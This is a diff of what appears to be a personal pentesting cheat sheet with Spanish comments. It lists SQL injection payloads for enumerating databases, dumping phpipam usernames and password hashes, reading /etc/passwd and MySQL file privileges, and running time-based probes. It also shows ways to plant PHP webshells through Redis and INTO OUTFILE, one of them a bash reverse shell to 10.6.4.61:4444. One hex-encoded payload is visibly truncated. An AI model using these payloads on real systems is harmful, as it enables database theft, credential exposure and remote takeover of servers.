@@ -16,6 +16,21 @@ admin'-- -
 admin' or '1'='1
 
 # sqli tipo error based
+# test sqli
+" union select 1,2,@@hostname,4 -- -.
+" union select 1,2,load_file('/etc/passwd'),4 -- -.
+
+# enumeration phpipam
+" union select 1,2,schema_name,4 from information_schema.schemata-- -.
+" union select 1,2,table_name,4 from information_schema.tables where table_schema = 'phpipam' limit 1,1-- -.
+" union select 1,2,column_name,4 from information_schema.columns where table_schema = 'phpipam' and table_name = 'users'-- -.
+" union select 1,2,concat(username,0x3a,password),4 from phpipam.users-- -.
+
+# buscando permisos para escribir en el sistema
+" union all select 1,2,user,4 from mysql.user-- -.
+" union all select 1,2,group_concat(user,0x3a,file_priv),4 from mysql.user-- -.
+" union all select 1,2,load_file('/etc/passwd'),4 from mysql.user-- -.
+
 # para encontrar cantidad de tablas
 order by 10
 
@@ -25,20 +40,6 @@ union select 1,2,3,version(); # consultado version del motor
 union select 1,2,3,load_file('/etc/passwd'); # LFI
 union select 1,load_file('C://windows//system32/drivers/etc/hosts'),2 # LFI
 
-# inyectando consultas
-union select schema_name,2,3,4 from information_schema.schemata; # muestra las BDs
-union select schema_name,2,3,4 from information_schema.schemata limit 1,1; # para forzar que muestre las DBs
-
-# tablas
-union select table_name,2,3,4 from information_schema.tables where table_schema = 'sqhell_5';
-
-# columnas
-union select 1,2,column_name,4 from information_schema.columns where table_schema = 'sqhell_5' and table_name = 'flag';
-
-# campos 
-union select 1,2,id,4 from sqhell_5.flag; # muestra el contenido de la tabla 
-union select 1,2,concat(id,0x3a,flag),4 from sqhell_5.flag; # muestra campos especificos
-/admin?user=0+union+select+1,concat(username,password),3,4+from+marketplace.users+limit+1,1
 # sqli tipo time based
 UNION SELECT SLEEP(2),2 FROM information_schema.columns WHERE table_schema ='sqli_four' and table_name = 'users' and column_name like '%';--
 UNION SELECT SLEEP(2),2 from users where username='admin' and password like '%';--
@@ -108,3 +109,10 @@ echo "CONFIG SET dir /var/www/html" | redis-cli
 echo "CONFIG SET dbfilename dosh.php" | redis-cli
 echo "SET PAYLOAD \"<?php system(\$_GET['cmd']); ?>\"" | redis-cli
 echo "BGSAVE" | redis-cli
+
+# RCE via INTO OUTFILE
+<?php system($_GET["cmd"]);?> to hex
+" union select 1,2,0x3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e,4 INTO OUTFILE '/var/www/html/sh.php'-- -.
+
+<?php exec("bash -c 'bash -i >& /dev/tcp/10.6.4.61/4444 0>&1'");?> to hex1
+" union select 1,2,0x3c3f7068702065786563282262617368202,4 INTO OUTFILE '/var/www/html/shell.php'-- -.
